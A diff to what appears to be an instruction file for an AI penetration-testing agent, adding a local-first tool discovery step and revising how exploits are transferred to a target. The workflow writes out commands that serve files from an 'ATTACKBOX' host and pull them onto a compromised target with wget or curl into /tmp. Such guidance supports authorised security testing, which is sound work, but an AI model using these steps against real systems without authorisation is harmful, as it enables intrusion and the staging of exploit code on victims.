@@ -69,6 +69,27 @@ and records state changes. Your return summary must include:
 - Pivot paths identified (what leads where)
 - Blocked items (what failed and why, whether retryable)
 
+## Tool Discovery (Local-First)
+
+Before downloading, cloning, or installing any tool, **check if it already
+exists on the attackbox.** Pentest distros (Kali, Parrot, BlackArch) and
+manually-installed toolkits often have everything you need.
+
+```bash
+# Check if a tool is already installed
+which dnstool.py 2>/dev/null || find /opt /usr/share /usr/local -name 'dnstool.py' -type f 2>/dev/null | head -3
+```
+
+**Search order:**
+1. `which <tool>` or `command -v <tool>` — checks $PATH
+2. `find /opt /usr/share /usr/local -name '<tool>' -type f` — common install locations
+3. `pip show <package>` or `pipx list` — Python packages
+4. `/home/*/.local/bin/`, `/usr/share/doc/python3-*/examples/` — pip/distro installs
+
+**Only clone or download if the tool is genuinely not present.** Every
+unnecessary `git clone` wastes time, burns tokens, and may clone a different
+version than what's already installed and tested.
+
 ## Exploit and Tool Transfer
 
 Never download exploits, scripts, or tools directly to the target from the
@@ -78,10 +99,11 @@ reach the target.
 
 **Attackbox-first workflow:**
 
-1. **Download on attackbox** — `git clone`, `curl`, `searchsploit -m` locally
-2. **Review** — inspect source code or binary provenance before transferring
-3. **Serve** — `python3 -m http.server 8080` from the directory containing the file
-4. **Pull from target** — `wget http://ATTACKBOX:8080/file -O /tmp/file` or
+1. **Check locally first** — see Tool Discovery above
+2. **Download on attackbox** (only if not found) — `git clone`, `curl`, `searchsploit -m` locally
+3. **Review** — inspect source code or binary provenance before transferring
+4. **Serve** — `python3 -m http.server 8080` from the directory containing the file
+5. **Pull from target** — `wget http://ATTACKBOX:8080/file -O /tmp/file` or
    `curl http://ATTACKBOX:8080/file -o /tmp/file`
 
 **Alternatives when HTTP is not viable:** `scp`/`sftp` (if SSH exists),
